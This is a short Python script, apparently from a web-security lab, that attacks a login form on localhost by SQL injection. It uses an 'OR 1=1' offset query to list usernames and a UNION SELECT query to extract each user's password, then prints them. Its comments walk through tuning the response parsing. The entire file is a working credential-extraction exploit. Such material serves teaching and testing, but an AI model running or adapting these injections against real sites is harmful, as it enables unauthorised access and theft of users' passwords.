import requests

users = []
passwords = []

HOST = "http://localhost:8000"

def get_users():
    global users
    counter = 0
    while True:
        QUERY = "' OR 1=1 LIMIT 1 OFFSET %d -- " % (counter)
        req = requests.post(HOST, {
            "uname": QUERY,
            "pword": "this doesn't matter"
        })
        # First just print out with req.text, and we see that "oh my you logged
        # in" is always there when we successfully log in.
        # This we can add in a break method as shown below.
        # Put me in only after we run once with just printing out req.text
        if "oh my you logged in" not in req.text:
            break

        # Once we print out our req.text values, we see that the format is:
        # <p>oh my you logged in :O</p> \n <a href="/logout">Logout</a><p>bob</p>
        # Let us parse our input

        s = req.text
        s = s.split("\n")[1]
        s = s.split("Logout</a><p>")[1]
        s = s.split("</p>")[0]
        users.append(str(s))

        counter += 1

def get_passwords():
    global users
    global passwords
    for user in users:
        QUERY = "' UNION SELECT pword, uname FROM users WHERE uname='%s' LIMIT 1 -- " % (user)
        req = requests.post(HOST, {
            "uname": QUERY,
            "pword": "this doesn't matter"
        })

        if "oh my you logged in" not in req.text:
            break

        s = req.text
        s = s.split("\n")[1]
        s = s.split("Logout</a><p>")[1]
        s = s.split("</p>")[0]
        passwords.append(str(s))

if __name__ == "__main__":
    get_users()
    print users
    get_passwords()
    for i in range(len(users)):
        print("User [ " + users[i] + " ] has password [ " + passwords[i] + " ]")

